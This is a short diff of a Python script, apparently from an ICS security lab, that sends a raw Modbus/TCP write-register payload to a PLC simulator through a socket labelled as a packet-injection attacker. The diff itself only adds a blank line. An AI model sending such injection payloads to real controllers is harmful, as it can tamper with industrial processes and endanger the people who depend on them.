@@ -8,6 +8,7 @@ payload = b"\x00\x01\x00\x00\x00\x06\x01\x06\x00\x04\x27\x0f"
 # af_net specifies the address family ipv4 and sockStream specifies tcp protocl
 
 print("Packet injection attacker attempting to connect to plc simulator...")
+
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     print("Packet injection attacker connected to plc simulator...")
     s.connect((target_host, target_port))
